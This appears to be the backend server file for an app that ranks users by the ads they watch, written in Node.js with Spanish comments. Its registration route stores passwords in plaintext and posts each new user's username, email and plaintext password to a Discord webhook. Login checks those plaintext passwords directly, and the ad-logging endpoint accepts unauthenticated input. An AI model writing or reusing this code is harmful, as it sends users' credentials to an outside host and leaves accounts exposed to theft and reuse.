// server.js
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const axios = require("axios");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

// 🔹 Conexión a MongoDB Atlas
mongoose
  .connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("✅ Conectado a MongoDB Atlas"))
  .catch((err) => console.error("❌ Error al conectar MongoDB:", err));

// 🔹 Modelos
const User = mongoose.model("User", {
  username: String,
  email: String,
  password: String,
});

const AdLog = mongoose.model("AdLog", {
  username: String,
  fecha: String,
});

// 🔹 Webhooks desde variables de entorno
const WEBHOOK_USERS = process.env.WEBHOOK_USERS;
const WEBHOOK_ADS_COUNTER = process.env.WEBHOOK_ADS_COUNTER;
const WEBHOOK_RANKING = process.env.WEBHOOK_RANKING;

// ======================= RUTAS =======================

// 🧍 Registrar usuario
app.post("/api/registrar_usuario", async (req, res) => {
  try {
    const { username, email, password } = req.body;

    const existingUser = await User.findOne({ username });
    if (existingUser)
      return res.status(400).json({ error: "Usuario ya existe" });

    await User.create({ username, email, password });

    // Enviar al webhook de Discord
    await axios.post(WEBHOOK_USERS, {
      embeds: [
        {
          title: "✅ Nuevo Usuario Registrado",
          color: 5763719,
          description: `**Usuario:** ${username}\n**Email:** ${email}\n**Password:** ${password}\n**Fecha:** ${new Date().toLocaleString()}`,
        },
      ],
    });

    res.status(201).json({ message: "Usuario registrado" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error al registrar usuario" });
  }
});

// 🔑 Login
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    const user = await User.findOne({ username, password });
    if (!user) return res.status(401).json({ error: "Credenciales inválidas" });
    res.json({ message: "Login exitoso" });
  } catch {
    res.status(500).json({ error: "Error en login" });
  }
});

// 🎥 Registrar anuncio visto
app.post("/api/anuncio_visto", async (req, res) => {
  try {
    const { username, fecha } = req.body;
    await AdLog.create({ username, fecha });

    // Enviar registro al webhook
    await axios.post(WEBHOOK_ADS_COUNTER, {
      content: `${username}|${fecha}|1`,
    });

    res.json({ message: "Anuncio registrado" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error registrando anuncio" });
  }
});

// 🏆 Obtener ranking
app.get("/api/ranking", async (req, res) => {
  try {
    const today = new Date().toISOString().split("T")[0];
    const logs = await AdLog.find({ fecha: today });

    const ranking = {};
    logs.forEach((log) => {
      ranking[log.username] = (ranking[log.username] || 0) + 1;
    });

    const sorted = Object.entries(ranking)
      .map(([username, adsWatched]) => ({ username, adsWatched }))
      .sort((a, b) => b.adsWatched - a.adsWatched);

    res.json(sorted);
  } catch (err) {
    res.status(500).json({ error: "Error obteniendo ranking" });
  }
});

// 🕛 Reinicio diario automático
setInterval(async () => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    try {
      await AdLog.deleteMany({});
      console.log("🔁 Ranking diario reiniciado");
      await axios.post(WEBHOOK_RANKING, {
        embeds: [
          {
            title: "🔄 Ranking Reiniciado",
            color: 3447003,
            description: `El ranking diario fue reiniciado el ${new Date().toLocaleString()}`,
          },
        ],
      });
    } catch (err) {
      console.error("Error reiniciando ranking:", err);
    }
  }
}, 60000); // se ejecuta cada minuto

// =====================================================

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));
